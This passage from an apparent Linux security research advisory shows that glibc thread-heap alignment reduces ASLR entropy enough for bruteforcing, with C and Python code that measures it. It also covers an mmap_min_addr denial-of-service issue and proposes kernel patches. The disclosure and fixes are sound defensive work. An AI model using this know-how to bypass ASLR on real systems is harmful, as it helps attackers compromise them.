+pthread_create. The pointer to this heap lies in TLS, so any thread allocates 
+memory from its own heap, which increases performance, since there is no need 
+to sync threads in case of concurrent malloc use. 
+But why then is the address "random"? 
+
+When allocating a new heap, glibc uses mmap; the size depends on the 
+configuration. In this case, the heap size is 64 MB. The heap start address 
+must be aligned to 64 MB. So the system first allocates 128 MB and then aligns 
+a piece of 64 MB in this range while unaligned pieces are released and create a 
+"hole" between the heap address and the closest region that was previously 
+allocated with mmap. 
+Randomness is brought about by the kernel itself when selectingmmap_based: this 
+address is not aligned to 64 MB, as were the mmap memory allocations before the 
+call of the malloc in question. 
+Regardless of why address alignment is required, this leads to a very 
+interesting effect: bruteforcing becomes possible. 
+
+The Linux kernel defines the process address space for x86-64 as "48 bits minus 
+one guard page", which for simplicity we will round to 2^48 (omitting the 
+one-page subtraction in our size calculations). 64 MB is 2^26, so the 
+significant bits equal 48 – 26 = 22, giving us a total of 2^22 various heaps of 
+secondary threads. 
+
+This substantially narrows the bruteforcing range. 
+
+Because the mmap address is selected in a known way, we can assume that the 
+heap of the first thread created with pthread_create will be selected as 64 MB 
+close to the upper address range. To be more precise, it will be close to all 
+the loaded libraries, loaded files, and so on. 
+In some cases, it is possible to calculate the total amount of memory allocated 
+before the call to the malloc in question. In our case, we loaded only glibc 
+and ld and created a stack for the thread. So this value is small. 
+
+mmap_base is selected with an entropy of 28 to 32 bits depending on kernel 
+settings at compile time (28 bits by default). So some top boundary is set off 
+by that same amount. 
+Thus, in many cases, the upper 8 bits of the address will equal 0x7f, while in 
+rare cases, they will be 0x7e. That gives us another 8 bits of certainty. There 
+are a total of 2^14 possible options for selecting a heap for the first thread. 
+The more threads are created, the lesser that value is for the next heap 
+selection.
+
+Let us illustrate this behavior with the following C code:
+
+void * first(void *x)
+{
+    int a = (int)x;
+    void *ptr;
+    ptr = malloc(8);
+    printf("%p\n", ptr );
+    return 0;
+}
+
+int main()
+{
+    pthread_t one;
+    pthread_create(&one, NULL, &first, 0);
+    void *val;
+    pthread_join(one,&val);
+    return 0;
+}
+
+Then let us launch the program a sufficient number of times with Python code 
+for collecting address statistics:
+
+import subprocess
+d = {}
+def dump(iteration, hysto):
+    print 'Iteration %d len %d'%(iteration, len(hysto))
+    for key in sorted(hysto):
+        print hex(key), hysto[key]
+i = 0
+while i < 1000000:
+    out = subprocess.check_output(['./t'])
+    addr = int(out, 16)
+    #omit page size
+    addr >>= 12
+    if addr in d:
+        d[addr] += 1
+    else:
+        d[addr] = 1
+    i += 1
+dump(i,d)
+
+This code launches the simple './t' program, which creates a new thread, a 
+sufficient number of times.
+The code allocates a buffer with the help of malloc and displays the buffer 
+address. Once the program has completed this, the address is read and the 
+program calculates how many times the address was encountered during operation 
+of the program. The script collects a total of 16,385 different addresses, 
+which equals 2^14+1. This is the number of attempts an attacker could make, in 
+the worst case, to guess the heap address of the program in question.
+
+========================================================================
+III. Solutions
+========================================================================
+
+In this article, we have reviewed several problems - some of them attended to 
+Linux Kernel, some to GNU Libc; now we can consider fixes for Linux Kernel 
+problems. You may track GNU Libc issues by following links:
+
+  - Stack protector easy to bypass 
+https://sourceware.org/bugzilla/show_bug.cgi?id=22850 
+  - ld library ELF load error  
+https://sourceware.org/bugzilla/show_bug.cgi?id=22851
+  - Thread stack and heap caches 
+https://sourceware.org/bugzilla/show_bug.cgi?id=22852
+  - Heap address of pthread_create thread is aligned 
+https://sourceware.org/bugzilla/show_bug.cgi?id=22853
+
+========================================================================
+III.1 Holes
+========================================================================
+
+As shown in Section II.4, the ELF interpreter loader in the Linux kernel 
+contains an error and allows releasing part of the interpreter library memory. 
+A relevant fix was proposed to the community, but was neglected without action: 
+
+https://lkml.org/lkml/2017/7/14/290
+
+========================================================================
+III.2 Order of loading ELF file segments
+========================================================================
+
+As noted above, in the kernel and in the code of the glibc library, there is no 
+checking of file ELF segments: the code simply trusts that they are in the 
+correct order. Proof-of-concept code, as well as a fix, is enclosed: 
+https://github.com/blackzert/aslur 
+
+The fix is quite simple: we go through the segments and ensure that the current 
+one does not overlap the next one, and that the segments are sorted in the 
+ascending order of vaddr. 
+
+https://lkml.org/lkml/2018/2/26/571
+
+========================================================================
+III.3 Use of mmap_min_addr when searching for mmap allocation addresses
+========================================================================
+
+As soon as a fix was written for mmap, in order to return addresses with 
+sufficient entropy, a problem arose: some mmap calls failed with an access 
+permission error. This happened even as root or when requested by the kernel 
+when executing execve. 
+
+In the address selection algorithm (described earlier in Introduction), one of 
+the listed options is checking addresses for security restrictions. In the 
+current implementation, this check verifies that the selected address is larger 
+than mmap_min_addr. This is a system variable that can be changed by an 
+administrator through sysctl. The system administrator can set any value, and 
+the process cannot allocate a page at an address less than this value. The 
+default value is 65536. 
+
+The problem was that when the address function for mmap was called on x86-64, 
+the Linux kernel used 4096 as the value of the minimal lower boundary, which is 
+less than the value of mmap_min_addr. The function cap_mmap_addr forbids this 
+operation if the selected address falls between 4096 and mmap_min_addr. 
+
+cap_mmap_addr is called implicitly; this function is registered as a hook for 
+security checking. This architectural solution raises questions: first, we 
+choose the address without having the ability to test it with external 
+criteria, and then we check its permissibility in accordance with the current 
+system parameters. If the address does not pass the check, then even if the 
+address is selected by the kernel, it can be "forbidden" and the entire 
+operation will end with the EPERM error. 
+
+An attacker can use this fact to cause denial of service in the entire system: 
+if the attacker can specify a very large value, no user process can start in 
+the system. Moreover, if the attacker manages to store this value in the system 
+parameters, then even rebooting will not help—all created processes will be 
+terminated with the EPERM error. 
+
+Currently, the fix is to use the mmap_min_addr value as the lowest allowable 
+address when making a request to the address search function. Such code is 
+already used for all other architectures. 
+What will happen if the system administrator starts changing this value on a 
+running machine? This question remains unanswered, since all new allocations 
+after the change may end with the EPERM error; no program code expects such an 
+error and does not know what to do with it. The mmap documentation states the 
+following: 
+
+"EPERM The operation was prevented by a file seal; see fcntl (2)." 
+
+That is to say, the kernel cannot return EPERM to MAP_ANONYMOUS, although in 
+fact that is not so. 
+  
+https://lkml.org/lkml/2018/2/26/1053
+
+========================================================================
+III.4 mmap
+========================================================================
+
+The main mmap problem discussed here is the lack of entropy in address choice. 
+Ideally, the logical fix would be to select memory randomly. To select it 
+randomly, one must first build a list of all free regions of appropriate size 
+and then, from that list, select a random region and an address from this 
+region that meets the search criteria (the length of the requested region and 
+the allowable lower and upper boundaries). 
+
+To implement this logic, the following approaches can be applied: 
+
+  1. Keep the list of voids in a descending-order array. In this case, the 
+choice of random element is made in a single operation, but maintaining this 
+array requires many operations for releasing (allocating) the memory when the 
+current virtual address space map of the process changes. 
+  2. Keep the list of voids in a tree and a list, in order to find an outer 
+boundary that satisfies the length requirement, and select a random element 
+from the array. If the element does not fit the minimum/maximum address 
+restrictions, select the next one, and so on until one is found (or none 
+remain). This approach involves complex list and tree structures similar to 
+those already existing for vma with regard to change of address space. 
+  3. Use the existing structure of the augmented red-black vma tree to bypass 
+the list of allowed gap voids and select a random address. In the worst case, 
+each choice will have to bypass all the peaks, but rebuilding the tree does not 
+incur any additional slowdown of performance. 
+
+Our choice went to the last approach. We can use the existing vma 
+organizational structure without adding redundancy and select an address using 
+the following algorithm: 
+  1. Use the existing algorithm to find a possible gap void with the largest 
+valid address. Also, record the structure of vma following it. If there is no 
+such structure, return ENOMEM. 
+  2. Record the found gap as the result and vma as the maximum upper boundary. 
+  3. Take the first vma structure from the doubly linked list. It will be a 
+leaf in the red-black tree, because it has the smallest address. 
+  4. Make a left-hand traversal of the tree from the selected vma, checking the 
+permissibility of the free region between the vma in question and its 
+predecessor. If the free region is allowed by the restrictions, obtain another 
+bit of entropy. If the entropy bit is 1, redefine the current value of the gap 
+void. 
+  5. Return a random address from the selected gap void region. 
+  One way to optimize the fourth step of the algorithm is not to enter subtrees 
+whose gap extension size is smaller than the required length. 
+
+This algorithm selects an address with sufficient entropy, although it is 
+slower than the current implementation. 
+
+As far as obvious drawbacks, it is necessary to bypass all vma structures that 
+have a sufficient gap void length. However, this is offset by the absence of 
+any performance slowdown when changing address space.
+
+Here is the output of `less /proc/self/maps` after the patch:
+
+314a2d0da000-314a2d101000 r-xp /lib/x86_64-linux-gnu/ld-2.26.so
+314a2d301000-314a2d302000 r--p /lib/x86_64-linux-gnu/ld-2.26.so
+314a2d302000-314a2d303000 rw-p /lib/x86_64-linux-gnu/ld-2.26.so
+314a2d303000-314a2d304000 rw-p 
+
+3169afcd8000-3169afcdb000 rw-p 
+
+316a94aa1000-316a94ac6000 r-xp /lib/x86_64-linux-gnu/libtinfo.so.5.9
+316a94ac6000-316a94cc5000 ---p /lib/x86_64-linux-gnu/libtinfo.so.5.9
+316a94cc5000-316a94cc9000 r--p /lib/x86_64-linux-gnu/libtinfo.so.5.9
+316a94cc9000-316a94cca000 rw-p /lib/x86_64-linux-gnu/libtinfo.so.5.9
+
+3204e362d000-3204e3630000 rw-p 
+
+4477fff2c000-447800102000 r-xp /lib/x86_64-linux-gnu/libc-2.26.so
+447800102000-447800302000 ---p /lib/x86_64-linux-gnu/libc-2.26.so
+447800302000-447800306000 r--p /lib/x86_64-linux-gnu/libc-2.26.so
+447800306000-447800308000 rw-p /lib/x86_64-linux-gnu/libc-2.26.so
+447800308000-44780030c000 rw-p 
+
+509000396000-509000d60000 r--p /usr/lib/locale/locale-archive
+
+56011c1b1000-56011c1d7000 r-xp /bin/less
+56011c3d6000-56011c3d7000 r--p /bin/less
+56011c3d7000-56011c3db000 rw-p /bin/less
+56011c3db000-56011c3df000 rw-p 
+
+56011e0d8000-56011e0f9000 rw-p [heap]
+
+7fff6b4a4000-7fff6b4c5000 rw-p [stack]
+7fff6b53b000-7fff6b53e000 r--p [vvar]
+7fff6b53e000-7fff6b540000 r-xp [vdso]
+ffffffffff600000-ffffffffff601000 r-xp [vsyscall] 
+
+https://lkml.org/lkml/2018/2/27/267
+
+========================================================================
+IV. Related Work
+========================================================================
+
+The problem with current mmap behavior was also found by other researches:
+
+Hector Marco-Gisbert, Ismael Ripoll-Ripoll. ASLR-NG: ASLR Next Generation. 2016 
+https://cybersecurity.upv.es/solutions/aslr-ng/ASLRNG-BH-white-paper.pdf 
+
+Julian Kirsch, Bruno Bierbaumer, Thomas Kittel and Claudia Eckert Dynamic 
+Loader Oriented Programming on Linux. 2017
+https://github.com/kirschju/wiedergaenger/blob/master/kirsch-roots-2017-paper.pdf 
+
+========================================================================
+V. References
+========================================================================
+
+	1. https://lkml.org/lkml/2012/11/5/673
+	2. https://cwe.mitre.org/data/definitions/119.html
+	3. https://cwe.mitre.org/data/definitions/190.html
+	4. https://cwe.mitre.org/data/definitions/120.html
+	5. https://cwe.mitre.org/data/definitions/704.html
+	6. https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html
+	7. https://www.cvedetails.com/cve/CVE-2014-9427/
+	8. https://source.android.com/security/enhancements/enhancements70
+	9. https://android-review.googlesource.com/c/platform/bionic/+/178130/2
+	10. http://gcc.gnu.org/onlinedocs/gcc-3.3/gcc/Thread-Local.html
+	11. http://www.phrack.org/issues/49/14.html#article
+	12. 
+http://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Buffer-Overflows-Linux-whitepaper.pdf
+	13. https://crypto.stanford.edu/cs155old/cs155-spring05/litch.pdf
+	14. 
+https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf
+	15. https://cwe.mitre.org/data/definitions/416.html
+	16. http://www.skyfree.org/linux/references/ELF_Format.pdf
+	17. https://lwn.net/Articles/741335/
+	18. https://cwe.mitre.org/data/definitions/457.html
+	19. http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html
+
+  All sources and patches could be found at https://github.com/blackzert/aslur 
+repo.
+
